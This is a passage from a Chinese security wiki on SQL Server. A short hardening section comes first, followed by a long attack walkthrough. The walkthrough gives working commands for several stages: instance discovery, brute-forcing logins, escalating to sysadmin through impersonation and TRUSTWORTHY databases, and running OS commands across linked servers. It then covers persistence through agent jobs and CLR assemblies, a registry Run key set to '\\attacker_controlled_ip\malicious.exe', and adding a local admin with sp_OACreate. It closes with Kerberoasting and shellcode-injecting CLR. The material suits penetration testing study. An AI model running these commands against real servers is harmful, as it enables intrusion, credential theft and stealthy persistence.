xp_regremovemultistring 不是应用程序必须使用时，建议删除以下存储过程： 123456789101112131415161718192021222324252627282930313233343536373839404142434445xp_perfend xp_perfmonitor xp_perfsample xp_perfstart xp_readerrorlog xp_readmail xp_revokelogin xp_runwebtask xp_schedulersignal xp_sendmail xp_servicecontrol xp_snmp_getstate xp_snmp_raisetrap xp_sprintf xp_sqlinventory xp_sqlregister xp_sqltrace xp_sscanf xp_startmail xp_stopmail xp_subdirs xp_unc_to_drive xp_dirtree xp_sdidebug xp_availablemedia xp_cmdshell xp_deletemail xp_dirtree xp_dropwebtask xp_dsninfo xp_enumdsn xp_enumerrorlogs xp_enumgroups xp_enumqueuedtasks xp_eventlog xp_findnextmsg xp_fixeddrives xp_getfiledetails xp_getnetname xp_grantlogin xp_logevent xp_loginconfig xp_logininfo xp_makewebtask xp_msver 删除不必要的功能和服务SQL Server的远程访问功能，允许网络上的其他SQL Server远程连接并执行存储过程。 如果不需要此功能，则应使用以下命令禁用该功能。 1234execute sp_configure &#x27;remote access&#x27;, &#x27;0&#x27;goreconfigure with overridego 或者使用Microsoft SQL Server Management Studio 1Microsoft SQL Server Management Studio -&gt; SQL Server（右键） -&gt; 属性 -&gt; 连接 配置选项“允许更新”定义数据库用户是否可以直接更新系统表。 这对于高级管理员来说可能是有用的临时功能，但对于正常操作，应该将其禁用： 1234execute sp_configure &#x27;allow updates&#x27;, &#x27;0&#x27;goreconfigure with overridego SQL Server Monitor，它侦听UDP端口1434并提供客户端不应访问有关服务器上存在的实例的信息，并且SQL Server将在其被阻止的情况下运行。 防火墙或应阻止来自TCP端口1433和UDP端口1434的外部通信。异构查询或临时查询允许数据库用户使用本地数据在远程服务器上执行查询。 该功能可能被滥用以强制使用远程或本地访问凭据，应在不需要此功能时，将其禁用： 1exec xp_regwrite N&#x27;HKEY_LOCAL_MACHINE&#x27;, N&#x27;SOFTWARE\\Microsoft\\MSSQLServer\\Providers\\SQLOLEDB&#x27;, N&#x27;DisallowAdhocAccess&#x27;, N&#x27;REG_DWORD&#x27;, 1 如果不需要，则应禁用SQL Server代理，Microsoft分布式事务处理协调器（MSDTC）和MSSearch服务。 可以使用企业管理器或通过在Windows Services管理工具中将其启动类型设置为“停止”来关闭服务。 1Microsoft SQL Server Management Studio -&gt; SQL Server -&gt; 管理 或者设置注册表值禁用服务： 123exec sp_set_sqlagent_properties @auto_start=0exec xp_regwrite N&#x27;HKEY_LOCAL_MACHINE&#x27;, N&#x27;SYSTEM\\CurrentControlSet\\Services\\MSDTC&#x27;, N&#x27;Start&#x27;, N&#x27;REG_DWORD&#x27;, 3exec xp_regwrite N&#x27;HKEY_LOCAL_MACHINE&#x27;, N&#x27;SYSTEM\\CurrentControlSet\\Services\\MSSEARCH&#x27;, N&#x27;Start&#x27;, N&#x27;REG_DWORD&#x27;, 3 进行这些更改后，应手动停止服务或重新启动服务器。 安装补丁最后的步骤是确保应用最新的服务包和补丁程序。将显示SQL Server的当前版本。 1select @@version 参考资料 https://www.quackit.com/sql_server/tutorial/sql_server_dts.cfm http://www.freetds.org/ http://freetds.cvs.sourceforge.net/checkout/freetds/freetds/doc/tds.html https://research.nccgroup.com/2021/01/21/mssql-lateral-movement/ https://xz.aliyun.com/t/7534 https://github.com/EPICROUTERSS/MSSQL-Fileless-Rootkit-WarSQLKit https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/sql/introduction-to-sql-server-clr-integration","tags":[{"name":"SQL Server","slug":"SQL-Server","permalink":"http://example.com/tags/SQL-Server/"}],"categories":[{"name":"数据库安全","slug":"数据库安全","permalink":"http://example.com/categories/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/"},{"name":"SQL Server","slug":"数据库安全/SQL-Server","permalink":"http://example.com/categories/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/SQL-Server/"}]},{"title":"SQL Server数据库攻防详解下篇","date":"2021-07-03T01:54:41.000Z","path":"wiki/数据库安全/SQL Server/SQL-Server数据库攻防详解下篇/","text":"[TOC] SQL Server攻击实战思路第二章简单介绍了SQL Server中常见的一写利用点，接下来介绍这些利用面在各个攻击阶段中的应用和一些思路。 SQL Server实例发现SQL Server的实例发现-，本地实例主要是通过检查系统服务和注册表方式。远程实例可以通过扫描TDS监听服务、UDP广播、SPN服务等方式。 常见的几种实例发现-工具： osql 1osql -L sqlcmd 1sqlcmd -L PowerUpSQL 1import-module .\\PowerUPSQL.psd1 //加载模块 1Get-SQLInstanceBroadcast //SQL Server实例发现- SQLPing3 Metasploit mssql_ping module Nmap Nessus …… 本地实例发现作为本地用户，主要是通过检查系统服务和注册表设置来标识SQL Server实例。 检查系统服务 检查注册表键值，也可判断SQL Server实例 1reg query &quot;HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Microsoft SQL Server&quot; /v InstalledInstances 使用PowerUpSQL，来识别本地实例。 12import-module .\\PowerUPSQL.psd1 //加载模块Get-SQLInstanceLocal //SQL Server实例发现- 远程实例发现123Get-SQLInstanceBroadcast -Verbose //UDP广播PingGet-SQLInstanceScanUDPThreaded -Verbose -ComputerName SQLServer1 //UDP端口扫描 Get-SQLInstanceFile -FilePath c:\\temp\\computers.txt | Get-SQLInstanceScanUDPThreaded -Verbose //从文件获取实例列表 域内实例发现域内实例主要利用SPN扫描发现实例，先简单介绍一下什么是SPN服务。 SPN服务Windows 域环境是基于活动目录（Active Directory）服务工作的。为了在域环境中有效地对资源访问权限进行精细控制，提高网络环境的安全性和方便网络资源统一分配管理。系统给域内每种资源分配了不同的服务主体名称（Service Principal Name, SPN）。使用Kerberos协议进行身份验证的域环境中，本地账号SPN将自动注册，但是，域内用户账号下运行的服务，必须为此域内账户手动注册。如下图SQL Server服务运行在域内用户时的状态。 因为域中每台机器都要在Kerberos身份验证服务中注册SPN，所以攻击者可以向域控制器（AD）发送请求，获取SPN相关信息，得到某个服务资源在哪台服务器上。 SQL Server服务的SPN示例： 12TERMSRV/MSSQL2.sec.com:1433服务组件名称/主机名.域名:监听端口 域内用户账号下运行的服务，手动注册SPN 1setspn -A MSSQLSvc/MSSQL2.sec.com:1433 mssqluser 更多SPN相关介绍请查看：https://social.technet.microsoft.com/wiki/contents/articles/717.service-principal-names-spn-setspn-syntax.aspx 域中安装的SQL Server会使用关联的服务帐户自动在活动目录（Active Directory）中注册，以支持Kerberos身份验证。可以使用以下方式识别实例： 1setspn -q */* setspn.exe。 adfind.exe。 Get-Spn.psm1。 PowerUpSQL 1Get-SQLInstanceDomain PowerUpSQL其他发现实例命令 描述 命令 使用备用域凭据发现Active Directory域SQL Server实例 runas /noprofile /netonly /user:domain\\user PowerShell.exe import-module PowerUpSQL.psd1 Get-SQLInstanceDomain -Verbose -DomainController 192.168.1.1 -Username domain\\user -password Password123 列出使用特定域帐户的SQL Server实例 Get-SQLInstanceDomain -Verbose -DomainAccount mssqluser 列出共享域用户SQL Server服务帐户 Get-SQLInstanceDomain -Verbose | Group-Object DomainAccount | Sort-Object count -Descending | select Count,Name | Where-Object {($.name -notlike “$”) -and ($.count -gt 1) } SQL Server口令爆破连接测试，两种功能均可用于测试。 12Get-SQLConnectionTestThreadedInvoke-SQLAuditWeakLoginPw 爆破必须的几个条件： 常见的弱密码 当前的本地用户访问权限 当前域用户访问权限 备用域用户访问权限 使用msf来执行爆破 1use auxiliary/scanner/mssql/mssql_login PowerUpSQL其他获取账户相关命令： 描述 命令 获取可用提供的SQL Server登录名登录的域SQL Server列表 $Targets = Get-SQLInstanceDomain -Verbose | Get-SQLConnectionTestThreaded -Verbose -Threads 10 -username testuser -password testpass | Where-Object {$_.Status -like “Accessible”} $Targets 获取可以使用当前域帐户登录的域SQL服务器的列表 $Targets = Get-SQLInstanceDomain -Verbose | Get-SQLConnectionTestThreaded -Verbose -Threads 10 | Where-Object {$_.Status -like “Accessible”} $Targets 获取可以使用备用域帐户登录的域SQL服务器的列表 runas /noprofile /netonly /user:domain\\user PowerShell.exe Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose -Threads 15 获取可以使用非域系统中的备用域帐户登录的域SQL服务器的列表。 runas /noprofile /netonly /user:domain\\user PowerShell.exe Get-SQLInstanceDomain -Verbose -Username ‘domain\\user’ -Password ‘MyPassword!’ -DomainController 10.1.1.1 | Get-SQLConnectionTestThreaded -Verbose -Threads 15 发现域SQL Server，并根据实例名称确定它们是否配置有普通应用程序使用的默认密码 Get-SQLInstanceDomain | Get-SQLServerLoginDefaultPw -Verbose SQL Server权限提升权限提升基本的一个思路： 域用户可以到处登录的前置条件。 添加了域用户 已添加本地用户 特权继承 获得Sysadmin权限的一些利用点： 获得低权限账号可以使用常用的凭据执行爆破，但要注意帐户锁定。 以PowerUpSQL为例： 1234import-module .\\PowerUPSQL.psd1 //加载模块。Get-SQLInstanceScanUDP | Invoke-SQLAuditWeakLoginPw //从未经身份验证的用户角度发起攻击。Get-SQLInstanceDomain | Invoke-SQLAuditWeakLoginPw //从域用户角度开始攻击。Get-SQLInstanceScanUDP | Get-SQLConnectionTestThreaded -Username &lt;USERNAME&gt; -Password &lt;PASSWORD&gt; //手动连接到已标识的SQL Server实例。 许多使用SQL Server Express作为后端的应用程序都是使用特定的凭据和实例名称配置的。使用以下命令检查这些凭据： 123import-module .\\PowerUPSQL.psd1 //加载模块。Get-SQLInstanceDomain | Invoke-SQLAuditDefaultLoginPwGet-SQLInstanceDomain | Get-SQLServerLoginDefaultPw 如果与SQL Server的通信未加密，我们可以执行MITM攻击来注入们自己的查询。根据欺骗的用户特权，我们可以注入SQL登录名。 sqlmitm.py 使用本地或域用户账号尝试使用当前帐户登录到SQL Server。过多的登录特权是常见的配置。 123import-module .\\PowerUpSQL.psd1Get-SQLInstanceDomain | Get-SQLConnectionTestGet-SQLInstanceLocal | Get-SQLConnectionTest 从Public到Sysadmin猜测弱密码获得高权限角色账号，一般需要以下两步： 枚举登录名 猜测密码 1.枚举登录名 默认情况下，Public角色成员不能选择本地列表登录，但可以进行Fuzz登录名。如果尝试枚举所有SQL Server登录名枚举，则只会看到其中一部分。查询出所有SQL Server登录名： 1SELECT name FROM sys.syslogins 1SELECT name FROM sys.server_principals suser_name返回给定主体ID的主体名称。可以通过使用Public角色，在suser_name函数中枚举主体ID值来标识SQL登录名。查询示例： 12345SELECT SUSER_NAME(1)SELECT SUSER_NAME(2)SELECT SUSER_NAME(3)SELECT SUSER_NAME(4)... 2.猜测密码 使用PowerUpSQL尝试对那些已识别出的的SQL Server登录名使用弱口令爆破。 12Get-SQLFuzzServerLogin -Instance ComputerNAme\\InstanceName //PowerUpSQL Blind SQL登录枚举Invoke-SQLAuditWeakLoginPw 3.获取当前域内用户名 public角色可以获取当前域信息，有利用盲猜域内其他组SID或用户名。 获取SQL Server所在的域： 1SELECT DEFAULT_DOMAIN() as mydomain 获取域内用户的完整SID。 1SELECT SUSER_SID(&#x27;&lt;Identified_Domain&gt;\\Domain Admins&#x27;) 10x010500000000000515000000CAAE870FA5F89ACD856A619851040000 获取域内Admins组的完整RID。 1SELECT SUSER_SID(&#x27;&lt;Identified_Domain&gt;\\Domain Admins&#x27;) 10x010500000000000515000000CAAE870FA5F89ACD856A619800020000 抓取完整RID的前48个字节以获取域的SID。通过将十六进制数字值附加到先前的SID来创建新的RID（将与域对象相关联）。 12RID=0x010500000000000515000000CAAE870FA5F89ACD856A619851040000SELECT SUSER_NAME(RID) //获取与RID关联的域对象名称。 PowerUpSQL也可盲猜域帐户。 1Get-SQLFuzzDomainAccount -Instance ComputerNAme\\InstanceName 利用Public获得更多权限在具有对SQL Server的Public权限账号的上下文中，最常用的获取执行权限的方法是： 特权模拟 存储过程和触发器创建/注入 写入存储过程的自动执行 SQL Server代理任务 xp_cmdshell 创建数据库链接到文件或服务器 导入/安装自定义CLR程序集 临时查询 共享服务帐户 数据库链接 UNC路径注入 Python/R脚本执行。 以上大部分内容在SQL Server常用攻击面已经介绍，不再赘述，下面简单介绍一下前面未提的方法。 1.特权模拟 SQL Server中有一个特权/权限，它允许权限较低的用户，模拟行使另一个具有更多访问权限的用户。不限制执行查询/命令，但必须将数据库配置为允许OS命令执行对象。 EXECUTE AS语句 默认情况下，会话在用户登录时开始，并在用户注销时结束。会话期间的所有操作都必须对该用户进行权限检查。当一个EXECUTE AS语句运行，会话的执行上下文切换到指定的登录名或用户名。上下文切换之后，将针对该帐户的登录名和用户安全性令牌而不是调用EXECUTE AS语句的人员检查权限。本质上，在会话或模块执行期间将模拟用户或登录帐户，或者显式还原上下文切换。 使用public角色用户testuser，手动检查是否是sa登录： 12SELECT SYSTEM_USERSELECT IS_SRVROLEMEMBER(&#x27;sysadmin&#x27;) //检查SQL Server 登录名是否为指定服务器角色的成员。 1EXECUTE AS LOGIN = &#x27;sa&#x27; //模拟sa数据库级别，对于服务器级别，请使用EXECUTE AS USER。 再次使用public角色用户testuser，手动检查目前模拟为sa登录： 12SELECT SYSTEM_USERSELECT IS_SRVROLEMEMBER(&#x27;sysadmin&#x27;) 2.存储过程和触发器创建/注入 开发人员的一个常见错误是将他们要使用的所有功能，将其写入存储过程中，以便能够在其他用户的上下文中执行。这些存储过程可以作为数据库的所有者（拥有所有者的EXECUTE AS）来执行，以使它可以访问其他资源。也可以在高权限用户的上下文中进行执行，并且不需要授予特权。但是，从安全的角度来看，采用此方法有一些缺点： 无法精细控制数据库所有者的权限。 普通帐户或sysadmin帐户通常拥有数据库。 DB_OWNER角色可以使用EXECUTE AS OWNER在sa或sysadmin帐户的上下文中执行。如果这些存储过程实现不安全，则可以通过扩展存储过程来通过SQL注入或命令注入进行模拟。例子： 1234567USE test2GOCREATE PROCEDURE test_imitation2WITH EXECUTE AS OWNERASEXEC sp_addsrvrolemember &#x27;testuser&#x27;,&#x27;sysadmin&#x27;GO 必须将数据库配置为值得信赖的OS命令执行程序。虽然可以通过SQL或命令注入进行模拟，但是创建存储过程或触发器是更好的选择。 攻击场景： DBA对Web应用程序执行以下操作： 123456CREATE LOGIN somebody WITH PASSWORD = &#x27;Password123&#x27;; //为WebApp创建SQL登录名。USE testALTER LOGIN [somebody] with default database = [test];CREATE USER somebody FROM LOGIN [somebody];EXEC sp_addrolemember [db_owner], [somebody]; //为此SQL登录名分配db_owner角色。Webapp可以从数据库访问所需的任何内容。ALTER DATABASE CurrentDB SET TRUSTWORTHY ON //将数据库设置为可信任的访问外部资源。 可以在查询中识别此类数据库 1SELECT SUSER_NAME(owner_id) as DBOWNER, d.name as DATABASENAME FROM sys.server_principals r INNER JOIN sys.server_role_members m on r.principal_id = m.role_principal_id INNER JOIN sys.server_principals p ON p.principal_id = m.member_principal_id inner join sys.databases d on suser_sname(d.owner_sid) = p.name WHERE is_trustworthy_on = 1 AND d.name NOT IN (&#x27;MSDB&#x27;) and r.type = &#x27;R&#x27; and r.name = N&#x27;sysadmin&#x27; 可以使用以下metasploit模块自动进行探测 12auxiliary/admin/mssql/mssql_escalate_dbownerauxiliary/admin/mssql/mssql_escalate_dbowner_sqi 更多方法可参考NetSpi博客 3.服务帐户 SQL Server所有版本都为服务帐户提供sysadmin特权。 列出常见的一些服务帐户类型： 域用户 本地用户 本地系统 网络服务 本地托管服务帐户 域托管服务帐户 PowerUpSQL的Invoke-SQLOSCMD可用于基本命令执行。 对于单个主机实例： 1Invoke-SQLOSCMD –Verbose –Instance &quot;server1\\instance1&quot; –Command &quot;whoami&quot; 对于域内实例： 1Get-SQLInstanceDomain | InvokeSQLOSCMD –Verbose –Command &quot;whoami&quot; 如果我们攻击了一个SQL Server，那么我们也将使用该共享帐户来攻击所有SQL Server。 4.爬数据库链接 数据库链接（Database Link）本质上是两个服务器之间的持久连接。数据库链接（Database Link）的作用是，允许一个数据库服务器去对其他的数据库服务器进行查询。数据链接可以用不同的方式进行配置，但是更多时候我们看到它们使用硬编码的凭据。 Public角色使用openquery()函数，对被链接的数据库服务器进行查询；也可以执行xp_cmdshell，对远程访问也无凭证要求。通常配置此功能会使数据库服务器，拥有过多的特权。因此允许在远程服务器上的模拟登录，切换到高权限账号的上下文中。下图简单说明当数据库对链接查询功能配置过高特权时，注入的payload是如何被传递： 列出所有链接的服务器名，通常有两个选项 1exec sp_linkedservers 和 1SELECT srvname FROM master..syservers 查询一个服务器的所有链接的服务器名： 1SELECT srvnaem From openquery(DB1, &#x27;select srvname FROM master..sysservers&#x27;) 查询一个服务器的某个链接的服务器所链接的服务器名： 1SELECT srvnaem From openquery(DB1, &#x27;select srvname FROM openquery(HVA, &quot;SELECT srvname FROM master..syservers&quot;)&#x27;) 查询可以一直嵌套执行，直到穷尽所有数据库服务器。在链接的服务器上执行命令： 1SELECT * FROM openquery(DB1, &#x27;SELECT * FROM openquery(HVA, &quot;SELECT 1; exec xp_cmdshell&#x27;&quot;&#x27;ping 192.168.1.1&quot;&quot; &#x27;&#x27;)&#x27;) SQL Server 2005 存在链接爬网命令执行漏洞，使用msf的mssql_linkcrawler模块可获得反弹shell。 1use exploit/windows/mssql/mssql_linkcrawler 自动化爬网的工具： mssql_linkcrawler PowerUpSQL …… 从系统管理员到Sysadmin首先先了解三个点： SQL Server较旧的版本为本地管理员提供sysadmin特权 SQL Server较旧的版本为本地系统提供sysadmin特权 SQL Server所有版本都为SQL Server服务帐户提供sysadmin特权 以下是利用点和常用工具列表： 利用点 常用工具 本地管理员身份访问DB Management Studio，sqlcmd和其他SQL客户端工具。 本地系统身份访问DB Psexec，可访问性选项，带有本机SQL客户端工具的调试器。 通过LSA Secrets恢复服务帐户密码 Mimikatz, Metasploit, lsadump. SQL Server服务进程注入 Metasploit, Python, Powershell （LoadLibrary，CreateRemoteThread等类似的功能） 从服务进程中窃取身份验证令牌 Metasploit, Incognito, Invoke-TokenManipulation 单用户模式 DBATools 以上利用点不一定适用所有SQL Server所有版本，下面简单列出一下适用版本（√：适用，×：不适用，?：可能适用），仅供参考： 利用点 SQL Server 2000 SQL Server 2005 SQL Server 2008 SQL Server 2012 SQL Server 2014 SQL Server 2016 服务凭证 √ √ √ √ √ √ 本地管理员 √ √ × × × × 本地系统 √ √ √ × × × SQL Server进程注入 √ √ √ √ √ ? 令牌窃取 √ √ √ √ √ ? 单用户模式 ? √ √ √ √ √ 附PowerUpSQL一些执行命令： 描述 命令 SQL Server帐户的域用户。 以域用户身份运行时，此功能将自动执行4件事。1.通过LDAP查询到DC的SPN来识别域上的SQL Server。2.尝试登录每个。3.使用多种方法执行UNC路径注入。4.尝试捕获关联的SQL Server服务帐户的密码哈希。 Invoke-SQLUncPathInjection -Verbose -CaptureIp 10.1.1.12 通过服务帐户模拟将OS管理员转换为sysadmin，然后所有PowerUpSQL命令都可以以sysadmin身份运行。 Invoke-SQLImpersonateService -Verbose -Instance MSSQLSRV04\\BOSCHSQL 审核问题 Invoke-SQLAudit -Verbose -Instance SQLServer1 升级到sysadmin Invoke-SQLEscalatePriv -Verbose -Instance SQLServer1 执行OS命令：xp_cmdshell $Targets | Invoke-SQLOSCmd -Verbose -Command “Whoami” -Threads 10 执行OS命令：自定义扩展存储过程 Create-SQLFileXpDll -OutFile c:\\temp\\test.dll -Command “echo test &gt; c:\\temp\\test.txt” -ExportName xp_test -Verbose将test.dll放在在SQL Server服务帐户可读的共享上。Get-SQLQuery -Verbose -Query “sp_addextendedproc ‘xp_test’, ‘\\yourserver\\yourshare\\myxp.dll’” xp_test sp_dropextendedproc ‘xp_test’ 执行OS命令：CLR $Targets | Invoke-SQLOSCLR -Verbose -Command “Whoami” 执行OS命令：Ole自动化过程 $Targets | Invoke-SQLOSOle -Verbose -Command “Whoami” 执行OS命令：外部脚本-R $Targets | Invoke-SQLOSR -Verbose -Command “Whoami” 执行OS命令：外部脚本-Python $Targets | Invoke-SQLOSPython -Verbose -Command “Whoami” 执行OS命令：代理作业-CmdExec $Targets | Invoke-SQLOSCmdAgentJob -Verbose -SubSystem CmdExec -Command “echo hello &gt; c:\\windows\\temp\\test1.txt” 执行OS命令：代理作业-PowerShell $Targets | Invoke-SQLOSCmdAgentJob -Verbose -SubSystem PowerShell -Command ‘write-output “hello world” | out-file c:\\windows\\temp\\test2.txt’ -Sleep 20 执行OS命令：代理作业-VBScript $Targets | Invoke-SQLOSCmdAgentJob -Verbose -SubSystem VBScript -Command ‘c:\\windows\\system32\\cmd.exe /c echo hello &gt; c:\\windows\\temp\\test3.txt’ 执行OS命令：代理作业-JScript $Targets | Invoke-SQLOSCmdAgentJob -Verbose -SubSystem JScript -Command ‘c:\\windows\\system32\\cmd.exe /c echo hello &gt; c:\\windows\\temp\\test3.txt’ 检索数据库链接 Get-SqlServerLinkCrawl -Verbose -Instance SQLSERVER1\\Instance1 检索数据库链接并执行查询 Get-SqlServerLinkCrawl -Verbose -Instance SQLSERVER1\\Instance1 -Query “select name from master..sysdatabases” 抓取数据库链接并执行OS命令 Get-SQLCrawl -instance “SQLSERVER1\\Instance1” -Query “exec master..xp_cmdshell ‘whoami’” 转储代理任务的内容。通常包含密码。详细输出包括作业摘要数据。 $Results = Get-SQLAgentJob -Verbose -Instance Server1\\Instance1 -Username sa -Password ‘123qweASD’ 枚举所有SQL登录名作为最低特权用户，并测试用户名作为密码。 针对单个服务器 Invoke-SQLAuditWeakLoginPw -Verbose -Instance SQLServer1\\Instance1 运行针对域SQL Server运行 $WeakPasswords = Get-SQLInstanceDomain -Verbose | Invoke-SQLAuditWeakLoginPw -Verbose $WeakPasswords SQL Server权限维持利用SQL Server设置权限维持方法，主要还是靠SQL Server代理作业，定期执行计划任务。为了实现无文件攻击，还利用CLR程序集功能，加载恶意DLL文件。通过这两种内置功能进行持久化，实现了在无文件落地、无其他进程的情况下，实施权限维持。 此持久化有几个前提条件： 启动SQL Server代理服务 开启CLR功能 将存储.Net程序集的数据库配置为可信赖的 以上均在SQL Server代理执行计划任务和SQL Server CLR相关利用详细介绍。 高隐蔽性持久化连接SQL Server数据库后，创建SQL Server代理作业，定时执行SQL语句调用恶意的用户自定义存储过程或函数利用SQL语句将CLR程序集以十六进制形式加载加载进数据库，实现通过用户自定义函数调用恶意的CLR程序集。已创建的SQL Server代理作业，定期执行计划任务，调用CLR程序集，实现无文件持久化。 首先创建名为CreateWarSQLKit的存储过程（WarSQLKit相关的利用可查看第二章中SQL ServerCLR相关利用的WarSQLKit篇章） 1234567USE msdb;CREATE procedure CreateWarSQLKit as CREATE ASSEMBLY [WarSQLKit] AUTHORIZATION [dbo] FROM 0x4D5A...... WITH PERMISSION_SET = UNSAFE;GO 创建SQL Server代理作业，定期执行CreateWarSQLKit，实现WarSQLKit的DLL文件持久化。 1234567891011USE msdb;EXEC dbo.sp_add_job @job_name = N&#x27;test_CreateWarSQLKit_job1&#x27;; EXEC sp_add_jobstep @job_name = N&#x27;test_CreateWarSQLKit_job1&#x27;, @step_name = N&#x27;test_CreateWarSQLKit_name1&#x27;, @subsystem = N&#x27;TSQL&#x27;, @command = N&#x27;exec CreateWarSQLKit&#x27;, @retry_attempts = 5, @retry_interval = 5 ;EXEC dbo.sp_add_jobserver @job_name = N&#x27;test_CreateWarSQLKit_job1&#x27;;EXEC dbo.sp_start_job N&#x27;test_CreateWarSQLKit_job1&#x27;; 其他方式实现持久化出了正常利用SQL Server可以执行系统命令的存储过程，以下操作都是作为SQL对象存储在数据库中，并且没有任何更改到磁盘，也可以做到无文件持久化。 可以为utilman.exe设置调试器，该调试器将在调用cmd.exe时运行。仅sysadmins特权。 12import-module .\\PowerUPSQL.psd1Get-SQLPersistentRegDebugger -Verbose -FileName utilman.exe -Command &#x27;c:\\windows\\system32\\cmd.exe&#x27; -Instance SQLServerName\\InstanceName&#x27; 可以利用CurrentVersion \\run与xp_regwrite建立。仅sysadmins特权。 12import-module .\\PowerUPSQL.psd1Get-SQLPersistentRegRun -Verbose -Name legit -Command &#x27;\\\\attacker_controlled_ip\\malicious.exe&#x27; -Instance &#x27;SQLServerName\\InstanceName&#x27; 可以将所有自定义CLR程序集导出到DLL，最后导入后门CLR。仅sysadmins特权。 123import-module .\\PowerUPSQL.psd1$Results = Get-SQLStoredProcedureCLR -Verbose -Instance &#x27;SQLServerName\\InstanceName&#x27; -UserName sa -Password &#x27;password&#x27; -ExportFolder c:\\tempCreate-SQLFileCLRDll -Verbose -SourceDllPath c:\\temp\\evil.exe 如果遇到SQLServer中的xplog70.dll文件被删除或放到其他地方了， xp_cmdshell就无法执行我们发出的命令了。可以考虑SQLServer中有一系列与OLE相关的存储过程，这一系列的存储过程同xp_cmdshell以及读取注册表系列的存储过程一样危险，所以被删除的可能性就小一些。这系列的存储过程有sp_OACreate，sp_OADestroy，sp_OAGetErrorInfo，sp_OAGetProperty，sp_OAMethod，sp_OASetProperty，sp_OAStop。 可以在系统添加一个用户名为test，密码为12345678，并加入管理员组。 123DECLARE @shell INT EXEC SP_OACREATE &#x27;wscript.shell&#x27;,@shell OUTPUT EXEC SP_OAMETHOD @shell,&#x27;run&#x27;,null, &#x27;c:\\windows\\system32\\cmd.exe /c net user test 12345678 /add&#x27;DECLARE @shell INT EXEC SP_OACREATE &#x27;wscript.shell&#x27;,@shell OUTPUT EXEC SP_OAMETHOD @shell,&#x27;run&#x27;,null, &#x27;c:\\windows\\system32\\cmd.exe /c net localgroup administrators test /add &#x27; xp_cmdshell、SP_OACREATE等可执行系统命令的存储过程，以及与它们相对应的动态连接库文件（DLL）都被删除了，还可以读取和修改注册表的存储过程（xp_regread、xp_regwrite）来克隆对方系统的管理员用户。 PowerUpSQL命令参考： 描述 命令 将所有自定义CLR程序集导出到DLL。它们可以脱机反编译，并且通常包含密码。而且，无需过多努力即可将其借壳。 $Results = Get-SQLStoredProcedureCLR -Verbose -Instance Server1\\Instance1 -Username sa -Password &#39;P@ssword!&#39; -ExportFolder c:\\temp `$Results 创建一个可用于导入现有（或后门）CLR程序集的SQL命令。 Create-SQLFileCLRDll -Verbose -SourceDllPath c:\\temp\\evil.dll 博客：https://blog.netspi.com/attacking-sql-server-clr-assemblies/)://blog.netspi.com/attacking-sql-server-clr-assemblies/ 创建可用于导入CLR程序集以执行OS命令的DLL和SQL命令。 Create-SQLFileCLRDll -Verbose -ProcedureName runcmd -OutDir c:\\temp -OutFile evil 获取共享SQL Server服务帐户的列表 `Get-SQLInstanceDomain -Verbose SQL Server横向移动Kerberoast攻击利用传统的Kerberoast攻击方式进行横向移动，Kerberoast是一种针对Kerberos协议的攻击方式。根据Kerberos协议，当向活动目录完成身份验证后，密钥分发中心（KDC）会将服务授权的票据（TGT）发送给用户，作为访问资源时的身份凭证。当需要访问资源，向票据服务器（TGS）发送Kerberos票据时，首先需要使用具有有效身份用户的票据（TGT）向票据服务器（TGS）请求乡音的服务票据。当该票据（TGT）被验证具有此服务的权限是，会向用户发送一张新的票据。新的票据使用SPN关联的计算机中的服务账号的NTLM Hash。攻击者可以尝试不同的NTLM Hash来开启Kerberos票据。NTLM Hash对应的是服务账号的密码。 实施此攻击前有几个前提条件： 域内用户运行的SQL Server已经手动注册过SPN Kerberos协议加密方式为RC4_HMAC_MD5 通过SQL Server能执行PowerShell命令的利用点和导入特定功能的CLR程序集即可完成Kerberoast攻击。 查看指定域内用户所注册的SPN 1setspn -L SEC\\MSSQL2 通过上文设置WarSQLKit的DLL存在sp_Mimikatz存储，执行mimikatz。 12exec sp_cmdExec &#x27;sp_Mimikatz&#x27;;select * from WarSQLKitTemp //获取Mimikatz日志 或者利用任何一种可以执行PowerShell命令的方式，可以请求到SPN的Kerberos票据： 123Add-Type -AssemblyName System.IdentityModel New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &quot;MSSQLSvc/MSSQL2.sec.com:1433&quot;exec xp_cmdshell &#x27;powershell Add-Type -AssemblyName System.IdentityModel ; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &quot;MSSQLSvc/MSSQL2.sec.com:1433&quot;&#x27; 之后可以使用PowerShell命令远程下载部署mimikatz，或者kerberoast。 1#mimikatz：kerberos::list /export 导出的票据会保存到当前目录的kirbi文件。 利用kerberoast中的tgsrepcrack.py脚本，离线破解NTLM Hash。 PowerUpSQL中使用Get-SQLServerPasswordHash，可自动提取SQL登录密码哈希： 12import-module .\\PowerUPSQL.psd1Get-SQLServerPasswordHash -Verbose -Instance &#x27;SQLServerName\\InstanceName&#x27; -Migrate CLR实现无文件落地横向移动David Cash在MSSQL Lateral Movement介绍了SQL Server中使用CLR自动执行横向移动而无文件落地和不需要xp_cmdshell，以及如何防止被检测到。 CLR相关的介绍在上文已经介绍，在此不再赘述。通常为实现命令执行而对MSSQL服务进行后期开发通常会利用XP_CMDSHELL存储过程在MSSQL进程的上下文中运行操作系统命令。要使用此技术运行自定义代码，通常需要使用LOLBINS，添加新的操作系统用户或通过BCP写入磁盘的二进制文件，这提供了明显的检测机会。 SQL Server服务进程可以执行提供给它的任何.NET代码，因此利用.NET代码进行横向移动，仅需要构建适当的DLL。作为概念的证明，为了生成了一个简单的程序集，该程序集对一些shellcode进行XOR并将其注入到生成的进程中。使用Squeak可以简化CLR代码的创建和调用，下面是Squeak具备的一些功能： 展示连接数据 从原始二进制文件和单字节XOR读取shellcode字节 生成一个MSSQL CLR DLL，该DLL对shellcode进行XOR，生成一个新进程，然后将shellcode注入其中。 计算DLL的SHA512哈希 生成带有硬编码参数的单个.NET可执行文件，以通过SQL连接执行DLL –该可执行文件执行以下操作： 创建一个SQL连接 检查SQL Server版本 检查DBA权限 检查并记录现有的安全设置 修改安全设置 创建并运行程序集 恢复安全设置并删除程序集 使用Squeak可以生成带有连接字符串和CLR程序集的独立可执行文件。CLR程序集的代码是从本地目录中的文件中加载，可以直接打开文件，也可以在工具中对其进行编辑。 